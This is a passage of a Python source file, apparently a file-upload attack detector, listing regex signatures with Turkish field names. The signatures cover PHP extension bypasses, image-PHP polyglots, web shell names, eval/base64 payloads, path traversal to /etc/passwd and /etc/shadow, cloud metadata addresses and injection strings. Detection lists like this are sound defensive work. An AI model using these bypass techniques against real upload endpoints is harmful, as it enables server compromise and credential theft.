    {"desen": r"\.php%20", "guven": 0.8, "aciklama": "Space appended PHP"},
    {"desen": r"\.php\t", "guven": 0.8, "aciklama": "Tab appended PHP"},
    {"desen": r"\.php\n", "guven": 0.8, "aciklama": "Newline appended PHP"},
    
    # Özel Karakterler
    {"desen": r"\.php:", "guven": 0.85, "aciklama": "Colon appended PHP"},
    {"desen": r"\.php;", "guven": 0.85, "aciklama": "Semicolon appended PHP"},
    {"desen": r"\.php,", "guven": 0.8, "aciklama": "Comma appended PHP"},
    {"desen": r"\.php\*", "guven": 0.8, "aciklama": "Asterisk appended PHP"},
    {"desen": r"\.php\?", "guven": 0.8, "aciklama": "Question mark appended PHP"},
    {"desen": r"\.php<", "guven": 0.8, "aciklama": "Less than appended PHP"},
    {"desen": r"\.php>", "guven": 0.8, "aciklama": "Greater than appended PHP"},
    {"desen": r"\.php\|", "guven": 0.8, "aciklama": "Pipe appended PHP"},
    
    # Dosya İsimleri Manipülasyonu
    {"desen": r"filename=['\"]\.htaccess['\"]", "guven": 0.95, "aciklama": "htaccess dosyası"},
    {"desen": r"filename=['\"]web\.config['\"]", "guven": 0.95, "aciklama": "web.config dosyası"},
    {"desen": r"filename=['\"]\.\.htaccess['\"]", "guven": 0.95, "aciklama": "htaccess path traversal"},
    {"desen": r"filename=['\"]config\.php['\"]", "guven": 0.9, "aciklama": "Config PHP dosyası"},
    {"desen": r"filename=['\"]shell\.php['\"]", "guven": 0.95, "aciklama": "Shell PHP dosyası"},
    {"desen": r"filename=['\"]backdoor\.php['\"]", "guven": 0.95, "aciklama": "Backdoor PHP dosyası"},
    {"desen": r"filename=['\"]webshell\.php['\"]", "guven": 0.95, "aciklama": "Webshell PHP dosyası"},
    {"desen": r"filename=['\"]cmd\.php['\"]", "guven": 0.95, "aciklama": "CMD PHP dosyası"},
    {"desen": r"filename=['\"]admin\.php['\"]", "guven": 0.8, "aciklama": "Admin PHP dosyası"},
    {"desen": r"filename=['\"]test\.php['\"]", "guven": 0.7, "aciklama": "Test PHP dosyası"},
    
    # Mime Type Bypass
    {"desen": r"Content-Type: image/jpeg.*\.php", "guven": 0.9, "aciklama": "JPEG mime type PHP bypass"},
    {"desen": r"Content-Type: image/png.*\.php", "guven": 0.9, "aciklama": "PNG mime type PHP bypass"},
    {"desen": r"Content-Type: image/gif.*\.php", "guven": 0.9, "aciklama": "GIF mime type PHP bypass"},
    {"desen": r"Content-Type: text/plain.*\.php", "guven": 0.85, "aciklama": "Text plain mime PHP bypass"},
    {"desen": r"Content-Type: application/pdf.*\.php", "guven": 0.85, "aciklama": "PDF mime PHP bypass"},
    
    # Uzun Filename Saldırıları
    {"desen": r"filename=['\"][A-Za-z0-9]{100,}\.php['\"]", "guven": 0.8, "aciklama": "Uzun filename PHP"},
    {"desen": r"filename=['\"].*[A-Za-z0-9]{200,}", "guven": 0.7, "aciklama": "Buffer overflow filename"},
    
    # Özel Bypass Teknikleri
    {"desen": r"\.php\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.jpg", "guven": 0.9, "aciklama": "Nokta flood bypass"},
    {"desen": r"\.php/\.\./\.\./\.\./\.\./\.\./\.\./etc/passwd", "guven": 0.95, "aciklama": "PHP path traversal passwd"},
    {"desen": r"\.php\?\?", "guven": 0.8, "aciklama": "Double question mark PHP"},
    {"desen": r"\.php\#", "guven": 0.7, "aciklama": "Hash appended PHP"},
    
    # Alternatif Script Uzantıları
    {"desen": r"\.cfml", "guven": 0.8, "aciklama": "ColdFusion Markup Language"},
    {"desen": r"\.shtml", "guven": 0.7, "aciklama": "Server Side Include HTML"},
    {"desen": r"\.shtm", "guven": 0.7, "aciklama": "Server Side Include HTM"},
    {"desen": r"\.stm", "guven": 0.7, "aciklama": "Server Template"},
    {"desen": r"\.pwml", "guven": 0.6, "aciklama": "Pocket Web Markup Language"},
    {"desen": r"\.php2", "guven": 0.85, "aciklama": "PHP2 uzantısı"},
    {"desen": r"\.php6", "guven": 0.85, "aciklama": "PHP6 uzantısı"},
    
    # Executable Dosya Türleri
    {"desen": r"\.msi", "guven": 0.9, "aciklama": "Windows Installer"},
    {"desen": r"\.app", "guven": 0.85, "aciklama": "Mac Application"},
    {"desen": r"\.deb", "guven": 0.8, "aciklama": "Debian Package"},
    {"desen": r"\.rpm", "guven": 0.8, "aciklama": "Red Hat Package"},
    {"desen": r"\.dmg", "guven": 0.8, "aciklama": "Mac Disk Image"},
    {"desen": r"\.iso", "guven": 0.7, "aciklama": "ISO Image"},
    {"desen": r"\.bin", "guven": 0.8, "aciklama": "Binary dosyası"},
    {"desen": r"\.run", "guven": 0.85, "aciklama": "Linux executable"},
    
    # Script Injection Desenleri
    {"desen": r"<script.*src=", "guven": 0.8, "aciklama": "External script include"},
    {"desen": r"javascript:", "guven": 0.7, "aciklama": "JavaScript protocol"},
    {"desen": r"vbscript:", "guven": 0.8, "aciklama": "VBScript protocol"},
    {"desen": r"data:text/html", "guven": 0.8, "aciklama": "Data URI HTML"},
    {"desen": r"data:text/javascript", "guven": 0.85, "aciklama": "Data URI JavaScript"},
    
    # Database Dosyaları
    {"desen": r"\.sql", "guven": 0.7, "aciklama": "SQL dosyası"},
    {"desen": r"\.db", "guven": 0.6, "aciklama": "Database dosyası"},
    {"desen": r"\.sqlite", "guven": 0.6, "aciklama": "SQLite database"},
    {"desen": r"\.mdb", "guven": 0.6, "aciklama": "Access database"},
    {"desen": r"\.backup", "guven": 0.7, "aciklama": "Backup dosyası"},
    {"desen": r"\.bak", "guven": 0.7, "aciklama": "Backup dosyası"},
    
    # Konfigürasyon Dosyaları
    {"desen": r"\.ini", "guven": 0.6, "aciklama": "INI konfigürasyon dosyası"},
    {"desen": r"\.cfg", "guven": 0.6, "aciklama": "Config dosyası"},
    {"desen": r"\.conf", "guven": 0.6, "aciklama": "Configuration dosyası"},
    {"desen": r"\.config", "guven": 0.7, "aciklama": "Configuration dosyası"},
    {"desen": r"\.properties", "guven": 0.6, "aciklama": "Properties dosyası"},
    {"desen": r"\.env", "guven": 0.8, "aciklama": "Environment dosyası"},
    
    # Log Dosyaları
    {"desen": r"\.log", "guven": 0.5, "aciklama": "Log dosyası"},
    {"desen": r"\.tmp", "guven": 0.6, "aciklama": "Temporary dosyası"},
    {"desen": r"\.temp", "guven": 0.6, "aciklama": "Temporary dosyası"},
    {"desen": r"\.cache", "guven": 0.5, "aciklama": "Cache dosyası"},
    
    # Sıkıştırılmış Dosyalar
    {"desen": r"\.zip", "guven": 0.6, "aciklama": "ZIP arşivi"},
    {"desen": r"\.rar", "guven": 0.6, "aciklama": "RAR arşivi"},
    {"desen": r"\.7z", "guven": 0.6, "aciklama": "7-Zip arşivi"},
    {"desen": r"\.tar", "guven": 0.6, "aciklama": "TAR arşivi"},
    {"desen": r"\.gz", "guven": 0.6, "aciklama": "GZIP arşivi"},
    {"desen": r"\.bz2", "guven": 0.6, "aciklama": "BZIP2 arşivi"},
    
    # Belge Dosyaları İçinde Script
    {"desen": r"\.doc.*macro", "guven": 0.8, "aciklama": "Word dökümanı macro"},
    {"desen": r"\.docx.*macro", "guven": 0.8, "aciklama": "Word dökümanı macro"},
    {"desen": r"\.xls.*macro", "guven": 0.8, "aciklama": "Excel macro"},
    {"desen": r"\.xlsx.*macro", "guven": 0.8, "aciklama": "Excel macro"},
    {"desen": r"\.ppt.*macro", "guven": 0.8, "aciklama": "PowerPoint macro"},
    {"desen": r"\.pptx.*macro", "guven": 0.8, "aciklama": "PowerPoint macro"},
    
    # Özel Encoding Bypass
    {"desen": r"\.ph\x70", "guven": 0.8, "aciklama": "Hex encoded PHP"},
    {"desen": r"\.p\x68\x70", "guven": 0.8, "aciklama": "Hex encoded PHP"},
    {"desen": r"\.php\x00", "guven": 0.9, "aciklama": "Null byte PHP"},
    {"desen": r"\.php%0a", "guven": 0.8, "aciklama": "URL encoded newline PHP"},
    {"desen": r"\.php%0d", "guven": 0.8, "aciklama": "URL encoded carriage return PHP"},
    
    # Race Condition Desenleri
    {"desen": r"filename=['\"]temp_.*\.php['\"]", "guven": 0.8, "aciklama": "Temporary PHP dosyası"},
    {"desen": r"filename=['\"]upload_.*\.php['\"]", "guven": 0.8, "aciklama": "Upload PHP dosyası"},
    {"desen": r"filename=['\"]tmp.*\.php['\"]", "guven": 0.8, "aciklama": "Tmp PHP dosyası"},
    
    # Symbolic Link Saldırıları
    {"desen": r"filename=['\"].*symlink", "guven": 0.7, "aciklama": "Symbolic link"},
    {"desen": r"filename=['\"]link.*", "guven": 0.6, "aciklama": "Link dosyası"},
    
    # Metadata Dosyaları
    {"desen": r"\.DS_Store", "guven": 0.6, "aciklama": "Mac metadata dosyası"},
    {"desen": r"Thumbs\.db", "guven": 0.6, "aciklama": "Windows thumbnail cache"},
    {"desen": r"\.git", "guven": 0.7, "aciklama": "Git metadata"},
    {"desen": r"\.svn", "guven": 0.7, "aciklama": "SVN metadata"},
    
    # Polyglot Dosyalar
    {"desen": r"GIF89a<\?php", "guven": 0.95, "aciklama": "GIF-PHP polyglot"},
    {"desen": r"PNG.*<script", "guven": 0.9, "aciklama": "PNG-JavaScript polyglot"},
    {"desen": r"JFIF.*<\?php", "guven": 0.95, "aciklama": "JPEG-PHP polyglot"},
    {"desen": r"PDF.*javascript", "guven": 0.85, "aciklama": "PDF-JavaScript polyglot"},
    
    # MIME Type Spoofing
    {"desen": r"Content-Type:.*image.*filename=.*\.php", "guven": 0.9, "aciklama": "Image MIME PHP spoofing"},
    {"desen": r"Content-Type:.*audio.*filename=.*\.php", "guven": 0.9, "aciklama": "Audio MIME PHP spoofing"},
    {"desen": r"Content-Type:.*video.*filename=.*\.php", "guven": 0.9, "aciklama": "Video MIME PHP spoofing"},
    {"desen": r"Content-Type:.*application/pdf.*filename=.*\.php", "guven": 0.9, "aciklama": "PDF MIME PHP spoofing"},
    
    # Farklı Platform Script Dosyaları
    {"desen": r"\.ps1", "guven": 0.9, "aciklama": "PowerShell script"},
    {"desen": r"\.psm1", "guven": 0.85, "aciklama": "PowerShell module"},
    {"desen": r"\.psd1", "guven": 0.8, "aciklama": "PowerShell data file"},
    {"desen": r"\.ws", "guven": 0.8, "aciklama": "Windows Script"},
    {"desen": r"\.wsf", "guven": 0.85, "aciklama": "Windows Script File"},
    {"desen": r"\.wsh", "guven": 0.8, "aciklama": "Windows Script Host"},
    
    # Template Dosyaları
    {"desen": r"\.tpl", "guven": 0.7, "aciklama": "Template dosyası"},
    {"desen": r"\.tmpl", "guven": 0.7, "aciklama": "Template dosyası"},
    {"desen": r"\.template", "guven": 0.7, "aciklama": "Template dosyası"},
    
    # XML ve Türevleri
    {"desen": r"\.xml.*<\?php", "guven": 0.9, "aciklama": "XML PHP injection"},
    {"desen": r"\.svg.*<script", "guven": 0.9, "aciklama": "SVG script injection"},
    {"desen": r"\.xsl.*<\?php", "guven": 0.9, "aciklama": "XSL PHP injection"},
    {"desen": r"\.xslt.*<script", "guven": 0.9, "aciklama": "XSLT script injection"},
    
    # Bypass İçin Özel Karakterler
    {"desen": r"\.php[\x01-\x1f]", "guven": 0.85, "aciklama": "Control character PHP bypass"},
    {"desen": r"\.php[\x7f-\xff]", "guven": 0.8, "aciklama": "Extended ASCII PHP bypass"},
    
    # Unicode Bypass Teknikleri
    {"desen": r"\.php\u0000", "guven": 0.9, "aciklama": "Unicode null byte PHP"},
    {"desen": r"\.php\u00a0", "guven": 0.8, "aciklama": "Unicode non-breaking space PHP"},
    {"desen": r"\.php\u200b", "guven": 0.8, "aciklama": "Unicode zero width space PHP"},
    {"desen": r"\.php\u2000", "guven": 0.8, "aciklama": "Unicode en quad space PHP"},
    {"desen": r"\.php\ufeff", "guven": 0.8, "aciklama": "Unicode BOM PHP"},
    
    # Farklı Slash Karakterleri
    {"desen": r"\.php\\\\", "guven": 0.8, "aciklama": "Double backslash PHP"},
    {"desen": r"\.php\/\/", "guven": 0.8, "aciklama": "Double forward slash PHP"},
    {"desen": r"\.php\u002f", "guven": 0.8, "aciklama": "Unicode slash PHP"},
    {"desen": r"\.php\u005c", "guven": 0.8, "aciklama": "Unicode backslash PHP"},
    
    # Dosya İsimleri İçin Özel Durumlar
    {"desen": r"filename=['\"]CON\.php['\"]", "guven": 0.9, "aciklama": "Windows reserved CON"},
    {"desen": r"filename=['\"]PRN\.php['\"]", "guven": 0.9, "aciklama": "Windows reserved PRN"},
    {"desen": r"filename=['\"]AUX\.php['\"]", "guven": 0.9, "aciklama": "Windows reserved AUX"},
    {"desen": r"filename=['\"]NUL\.php['\"]", "guven": 0.9, "aciklama": "Windows reserved NUL"},
    {"desen": r"filename=['\"]COM[1-9]\.php['\"]", "guven": 0.9, "aciklama": "Windows reserved COM"},
    {"desen": r"filename=['\"]LPT[1-9]\.php['\"]", "guven": 0.9, "aciklama": "Windows reserved LPT"},
    
    # Uzantı Spoofing
    {"desen": r"\.phpx", "guven": 0.8, "aciklama": "PHP extension spoofing"},
    {"desen": r"\.phpp", "guven": 0.8, "aciklama": "PHP extension spoofing"},
    {"desen": r"\.ph\u0070", "guven": 0.8, "aciklama": "Unicode p in PHP"},
    {"desen": r"\.p\u0068p", "guven": 0.8, "aciklama": "Unicode h in PHP"},
    {"desen": r"\.\u0070hp", "guven": 0.8, "aciklama": "Unicode p start PHP"},
    
    # Content-Length Manipülasyonu
    {"desen": r"Content-Length: -1", "guven": 0.7, "aciklama": "Negative content length"},
    {"desen": r"Content-Length: 999999999", "guven": 0.7, "aciklama": "Large content length"},
    {"desen": r"Content-Length:\s*0.*\.php", "guven": 0.8, "aciklama": "Zero length PHP"},
    
    # HTTP Method Bypass
    {"desen": r"X-HTTP-Method-Override.*PUT", "guven": 0.7, "aciklama": "HTTP method override PUT"},
    {"desen": r"X-HTTP-Method.*DELETE", "guven": 0.7, "aciklama": "HTTP method DELETE"},
    {"desen": r"_method=PUT", "guven": 0.6, "aciklama": "Form method override PUT"},
    {"desen": r"_method=PATCH", "guven": 0.6, "aciklama": "Form method override PATCH"},
    
    # Boundary Manipülasyonu
    {"desen": r"boundary=.*--", "guven": 0.6, "aciklama": "Multipart boundary"},
    {"desen": r"boundary=[^;]*\x00", "guven": 0.8, "aciklama": "Null byte boundary"},
    {"desen": r"boundary=.*\.\.", "guven": 0.7, "aciklama": "Path traversal boundary"},
    
    # File Size Bypass
    {"desen": r"Content-Length: 0.*filename=.*\.php", "guven": 0.85, "aciklama": "Zero byte PHP upload"},
    {"desen": r"Content-Length: 1.*filename=.*\.php", "guven": 0.8, "aciklama": "One byte PHP upload"},
    
    # Magic Number Bypass
    {"desen": r"\x89PNG.*<\?php", "guven": 0.95, "aciklama": "PNG magic number PHP"},
    {"desen": r"GIF8[79]a.*<\?php", "guven": 0.95, "aciklama": "GIF magic number PHP"},
    {"desen": r"\xff\xd8\xff\xe0.*<\?php", "guven": 0.95, "aciklama": "JPEG magic number PHP"},
    {"desen": r"BMP.*<\?php", "guven": 0.9, "aciklama": "BMP magic number PHP"},
    {"desen": r"RIFF.*<\?php", "guven": 0.9, "aciklama": "RIFF format PHP"},
    
    # Farklı Script Tag Varyasyonları
    {"desen": r"<SCRIPT", "guven": 0.8, "aciklama": "Uppercase script tag"},
    {"desen": r"<Script", "guven": 0.8, "aciklama": "Mixed case script tag"},
    {"desen": r"<sCrIpT", "guven": 0.8, "aciklama": "Mixed case script tag 2"},
    {"desen": r"<\s*script", "guven": 0.8, "aciklama": "Whitespace script tag"},
    {"desen": r"<script\s*>", "guven": 0.8, "aciklama": "Script tag with whitespace"},
    
    # PHP Tag Varyasyonları
    {"desen": r"<\?\s*php", "guven": 0.9, "aciklama": "PHP tag with whitespace"},
    {"desen": r"<\?PHP", "guven": 0.9, "aciklama": "Uppercase PHP tag"},
    {"desen": r"<\?Php", "guven": 0.9, "aciklama": "Mixed case PHP tag"},
    {"desen": r"<\?pHp", "guven": 0.9, "aciklama": "Mixed case PHP tag 2"},
    {"desen": r"<%.*php", "guven": 0.8, "aciklama": "ASP style PHP tag"},
    {"desen": r"<script\s*language=['\"]php['\"]", "guven": 0.9, "aciklama": "Script language PHP"},
    
    # Base64 Encoded Payloads
    {"desen": r"base64_decode\(", "guven": 0.85, "aciklama": "Base64 decode function"},
    {"desen": r"eval\(base64_decode", "guven": 0.95, "aciklama": "Eval base64 decode"},
    {"desen": r"PD9waHA=", "guven": 0.9, "aciklama": "Base64 encoded <?php"},
    {"desen": r"c3lzdGVt", "guven": 0.85, "aciklama": "Base64 encoded system"},
    {"desen": r"ZXhlYw==", "guven": 0.85, "aciklama": "Base64 encoded exec"},
    
    # Hex Encoded Payloads
    {"desen": r"\\x3c\\x3f\\x70\\x68\\x70", "guven": 0.9, "aciklama": "Hex encoded <?php"},
    {"desen": r"0x3c3f706870", "guven": 0.9, "aciklama": "Hex value <?php"},
    {"desen": r"\\x73\\x79\\x73\\x74\\x65\\x6d", "guven": 0.85, "aciklama": "Hex encoded system"},
    
    # ROT13 ve Diğer Encoding
    {"desen": r"str_rot13\(", "guven": 0.8, "aciklama": "ROT13 string rotation"},
    {"desen": r"gzinflate\(", "guven": 0.85, "aciklama": "GZIP inflate function"},
    {"desen": r"gzuncompress\(", "guven": 0.85, "aciklama": "GZIP uncompress function"},
    {"desen": r"gzdecode\(", "guven": 0.85, "aciklama": "GZIP decode function"},
    
    # Obfuscated Function Names
    {"desen": r"\$[a-zA-Z_][a-zA-Z0-9_]*\(\$", "guven": 0.7, "aciklama": "Variable function call"},
    {"desen": r"call_user_func\(", "guven": 0.8, "aciklama": "Call user function"},
    {"desen": r"call_user_func_array\(", "guven": 0.8, "aciklama": "Call user function array"},
    {"desen": r"create_function\(", "guven": 0.85, "aciklama": "Create function"},
    {"desen": r"array_map\(", "guven": 0.7, "aciklama": "Array map function"},
    {"desen": r"array_filter\(", "guven": 0.7, "aciklama": "Array filter function"},
    
    # Command Injection Patterns
    {"desen": r"`.*`", "guven": 0.8, "aciklama": "Backtick command execution"},
    {"desen": r"shell_exec\(", "guven": 0.95, "aciklama": "Shell exec function"},
    {"desen": r"proc_open\(", "guven": 0.9, "aciklama": "Process open function"},
    {"desen": r"popen\(", "guven": 0.9, "aciklama": "Pipe open function"},
    
    # File System Functions
    {"desen": r"file_get_contents\(", "guven": 0.7, "aciklama": "File get contents"},
    {"desen": r"file_put_contents\(", "guven": 0.8, "aciklama": "File put contents"},
    {"desen": r"fopen\(", "guven": 0.7, "aciklama": "File open function"},
    {"desen": r"fwrite\(", "guven": 0.8, "aciklama": "File write function"},
    {"desen": r"fputs\(", "guven": 0.8, "aciklama": "File puts function"},
    {"desen": r"fgets\(", "guven": 0.6, "aciklama": "File gets function"},
    {"desen": r"readfile\(", "guven": 0.7, "aciklama": "Read file function"},
    {"desen": r"include\(", "guven": 0.8, "aciklama": "Include function"},
    {"desen": r"require\(", "guven": 0.8, "aciklama": "Require function"},
    {"desen": r"include_once\(", "guven": 0.8, "aciklama": "Include once function"},
    {"desen": r"require_once\(", "guven": 0.8, "aciklama": "Require once function"},
    
    # Network Functions
    {"desen": r"curl_exec\(", "guven": 0.7, "aciklama": "cURL exec function"},
    {"desen": r"fsockopen\(", "guven": 0.8, "aciklama": "Socket open function"},
    {"desen": r"socket_create\(", "guven": 0.8, "aciklama": "Socket create function"},
    {"desen": r"stream_socket_client\(", "guven": 0.8, "aciklama": "Stream socket client"},
    
    # Dangerous Global Variables
    {"desen": r"\$GLOBALS\[", "guven": 0.7, "aciklama": "PHP GLOBALS array"},
    {"desen": r"\$_SERVER\[", "guven": 0.6, "aciklama": "PHP SERVER array"},
    {"desen": r"\$_ENV\[", "guven": 0.6, "aciklama": "PHP ENV array"},
    {"desen": r"\$_COOKIE\[", "guven": 0.6, "aciklama": "PHP COOKIE array"},
    {"desen": r"\$_SESSION\[", "guven": 0.6, "aciklama": "PHP SESSION array"},
    {"desen": r"\$_FILES\[", "guven": 0.7, "aciklama": "PHP FILES array"},
    
    # SQL Injection in Upload
    {"desen": r"filename=['\"].*UNION.*SELECT", "guven": 0.8, "aciklama": "SQL injection in filename"},
    {"desen": r"filename=['\"].*OR.*1=1", "guven": 0.8, "aciklama": "SQL injection OR condition"},
    {"desen": r"filename=['\"].*DROP.*TABLE", "guven": 0.9, "aciklama": "SQL DROP injection"},
    {"desen": r"filename=['\"].*INSERT.*INTO", "guven": 0.8, "aciklama": "SQL INSERT injection"},
    
    # XSS in Upload
    {"desen": r"filename=['\"].*<script.*alert", "guven": 0.8, "aciklama": "XSS alert in filename"},
    {"desen": r"filename=['\"].*javascript:alert", "guven": 0.8, "aciklama": "JavaScript alert in filename"},
    {"desen": r"filename=['\"].*onload=", "guven": 0.8, "aciklama": "Onload event in filename"},
    {"desen": r"filename=['\"].*onerror=", "guven": 0.8, "aciklama": "Onerror event in filename"},
    
    # LDAP Injection
    {"desen": r"filename=['\"].*\)\(\|", "guven": 0.7, "aciklama": "LDAP injection pattern"},
    {"desen": r"filename=['\"].*\*\)\(\&", "guven": 0.7, "aciklama": "LDAP wildcard injection"},
    
    # NoSQL Injection
    {"desen": r"filename=['\"].*\$ne:", "guven": 0.7, "aciklama": "MongoDB ne injection"},
    {"desen": r"filename=['\"].*\$gt:", "guven": 0.7, "aciklama": "MongoDB gt injection"},
    {"desen": r"filename=['\"].*\$regex:", "guven": 0.7, "aciklama": "MongoDB regex injection"},
    
    # Template Injection
    {"desen": r"filename=['\"].*{{.*}}", "guven": 0.8, "aciklama": "Template injection"},
    {"desen": r"filename=['\"].*\${.*}", "guven": 0.8, "aciklama": "Expression language injection"},
    {"desen": r"filename=['\"].*<%=.*%>", "guven": 0.8, "aciklama": "JSP expression injection"},
    
    # SSTI (Server Side Template Injection)
    {"desen": r"filename=['\"].*{{config}}", "guven": 0.9, "aciklama": "Flask SSTI config"},
    {"desen": r"filename=['\"].*{{request}}", "guven": 0.8, "aciklama": "Flask SSTI request"},
    {"desen": r"filename=['\"].*{{7\*7}}", "guven": 0.8, "aciklama": "Template math injection"},
    
    # XXE (XML External Entity)
    {"desen": r"<!ENTITY.*SYSTEM", "guven": 0.9, "aciklama": "XXE external entity"},
    {"desen": r"<!DOCTYPE.*\[.*<!ENTITY", "guven": 0.9, "aciklama": "XXE DOCTYPE entity"},
    
    # SSRF (Server Side Request Forgery)
    {"desen": r"filename=['\"].*http://", "guven": 0.7, "aciklama": "HTTP URL in filename"},
    {"desen": r"filename=['\"].*https://", "guven": 0.7, "aciklama": "HTTPS URL in filename"},
    {"desen": r"filename=['\"].*ftp://", "guven": 0.7, "aciklama": "FTP URL in filename"},
    {"desen": r"filename=['\"].*gopher://", "guven": 0.8, "aciklama": "Gopher URL in filename"},
    {"desen": r"filename=['\"].*dict://", "guven": 0.8, "aciklama": "Dict URL in filename"},
    {"desen": r"filename=['\"].*file://", "guven": 0.9, "aciklama": "File URL in filename"},
    
    # Deserialization Attacks
    {"desen": r"unserialize\(", "guven": 0.8, "aciklama": "PHP unserialize function"},
    {"desen": r"O:[0-9]+:", "guven": 0.8, "aciklama": "PHP serialized object"},
    {"desen": r"__wakeup", "guven": 0.8, "aciklama": "PHP magic method wakeup"},
    {"desen": r"__destruct", "guven": 0.8, "aciklama": "PHP magic method destruct"},
    
    # YAML Injection
    {"desen": r"!!python/object/apply", "guven": 0.9, "aciklama": "YAML Python object"},
    {"desen": r"!!map", "guven": 0.6, "aciklama": "YAML map"},
    {"desen": r"!!str", "guven": 0.5, "aciklama": "YAML string"},
    
    # CSV Injection
    {"desen": r"filename=['\"].*=.*\|", "guven": 0.7, "aciklama": "CSV formula injection"},
    {"desen": r"filename=['\"].*@SUM", "guven": 0.8, "aciklama": "CSV SUM formula"},
    {"desen": r"filename=['\"].*\+.*\|", "guven": 0.7, "aciklama": "CSV plus formula"},
    
    # Binary Exploitation Patterns
    {"desen": r"\\x41\\x41\\x41\\x41", "guven": 0.8, "aciklama": "Buffer overflow pattern"},
    {"desen": r"%n%n%n%n", "guven": 0.8, "aciklama": "Format string attack"},
    {"desen": r"\\x90\\x90\\x90\\x90", "guven": 0.9, "aciklama": "NOP sled pattern"},
    
    # Environment Variable Injection
    {"desen": r"filename=['\"].*\$PATH", "guven": 0.7, "aciklama": "PATH variable injection"},
    {"desen": r"filename=['\"].*\$HOME", "guven": 0.7, "aciklama": "HOME variable injection"},
    {"desen": r"filename=['\"].*\$USER", "guven": 0.7, "aciklama": "USER variable injection"},
    
    # Windows Specific Attacks
    {"desen": r"filename=['\"].*%SYSTEMROOT%", "guven": 0.8, "aciklama": "Windows SYSTEMROOT"},
    {"desen": r"filename=['\"].*%TEMP%", "guven": 0.7, "aciklama": "Windows TEMP variable"},
    {"desen": r"filename=['\"].*%APPDATA%", "guven": 0.7, "aciklama": "Windows APPDATA"},
    
    # Linux Specific Attacks
    {"desen": r"filename=['\"].*\/proc\/", "guven": 0.8, "aciklama": "Linux proc filesystem"},
    {"desen": r"filename=['\"].*\/dev\/null", "guven": 0.6, "aciklama": "Linux dev null"},
    {"desen": r"filename=['\"].*\/etc\/shadow", "guven": 0.95, "aciklama": "Linux shadow file"},
    {"desen": r"filename=['\"].*\/etc\/hosts", "guven": 0.8, "aciklama": "Linux hosts file"},
    
    # MAC Specific Attacks
    {"desen": r"filename=['\"].*\/Library\/", "guven": 0.7, "aciklama": "Mac Library directory"},
    {"desen": r"filename=['\"].*\/System\/", "guven": 0.8, "aciklama": "Mac System directory"},
    {"desen": r"filename=['\"].*\.plist", "guven": 0.7, "aciklama": "Mac plist file"},
    
    # Cloud Platform Attacks
    {"desen": r"filename=['\"].*169\.254\.169\.254", "guven": 0.9, "aciklama": "AWS metadata IP"},
    {"desen": r"filename=['\"].*metadata\.google\.internal", "guven": 0.9, "aciklama": "GCP metadata"},
    {"desen": r"filename=['\"].*169\.254\.169\.254\/metadata", "guven": 0.95, "aciklama": "Cloud metadata endpoint"},
    
    # Container Escape Patterns
    {"desen": r"filename=['\"].*\/proc\/self\/exe", "guven": 0.8, "aciklama": "Container self exe"},
    {"desen": r"filename=['\"].*\/proc\/mounts", "guven": 0.7, "aciklama": "Container mounts"},
    {"desen": r"filename=['\"].*\/proc\/version", "guven": 0.6, "aciklama": "Container version info"},
    
    # Advanced Evasion Techniques
    {"desen": r"\.ph\u0070\u200d", "guven": 0.85, "aciklama": "Zero width joiner PHP"},
    {"desen": r"\.php\u034f", "guven": 0.85, "aciklama": "Combining grapheme joiner PHP"},
    {"desen": r"\.php\u180e", "guven": 0.8, "aciklama": "Mongolian vowel separator PHP"},
    {"desen": r"\.php\u2060", "guven": 0.8, "aciklama": "Word joiner PHP"},
    {"desen": r"\.php\u2061", "guven": 0.8, "aciklama": "Function application PHP"},
    
    # Additional Web Shell Patterns
    {"desen": r"r57shell", "guven": 0.95, "aciklama": "R57 web shell"},
    {"desen": r"c99shell", "guven": 0.95, "aciklama": "C99 web shell"},
    {"desen": r"wso\.php", "guven": 0.95, "aciklama": "WSO web shell"},
    {"desen": r"b374k", "guven": 0.95, "aciklama": "B374k web shell"},
    {"desen": r"adminer\.php", "guven": 0.8, "aciklama": "Adminer database tool"},
    {"desen": r"phpMyAdmin", "guven": 0.7, "aciklama": "phpMyAdmin"},
    
    # Steganography Patterns
    {"desen": r"filename=['\"].*\.jpg.*hide", "guven": 0.7, "aciklama": "Steganography JPG"},
    {"desen": r"filename=['\"].*\.png.*embed", "guven": 0.7, "aciklama": "Steganography PNG"},
    {"desen": r"filename=['\"].*\.wav.*data", "guven": 0.7, "aciklama": "Steganography WAV"},
    
    # Cryptocurrency Mining Patterns
    {"desen": r"filename=['\"].*miner\.js", "guven": 0.8, "aciklama": "JavaScript miner"},
    {"desen": r"filename=['\"].*cryptonight", "guven": 0.9, "aciklama": "CryptoNight algorithm"},
    {"desen": r"filename=['\"].*monero", "guven": 0.8, "aciklama": "Monero mining"},
    
    # Botnet Patterns
    {"desen": r"filename=['\"].*bot\.php", "guven": 0.9, "aciklama": "PHP bot"},
    {"desen": r"filename=['\"].*irc\.php", "guven": 0.85, "aciklama": "IRC bot"},
    {"desen": r"filename=['\"].*ddos\.php", "guven": 0.95, "aciklama": "DDoS script"},
    
    # Anti-Forensics Patterns
    {"desen": r"filename=['\"].*wipe\.php", "guven": 0.8, "aciklama": "File wiping script"},
    {"desen": r"filename=['\"].*shred\.php", "guven": 0.8, "aciklama": "File shredding script"},
    {"desen": r"filename=['\"].*clear\.php", "guven": 0.7, "aciklama": "Log clearing script"},
    
    # Advanced Persistence
    {"desen": r"filename=['\"].*cron\.php", "guven": 0.8, "aciklama": "Cron job script"},
    {"desen": r"filename=['\"].*startup\.php", "guven": 0.8, "aciklama": "Startup script"},
    {"desen": r"filename=['\"].*service\.php", "guven": 0.8, "aciklama": "Service script"},
    
    # Protocol Handlers
    {"desen": r"filename=['\"].*mailto:", "guven": 0.6, "aciklama": "Mailto protocol"},
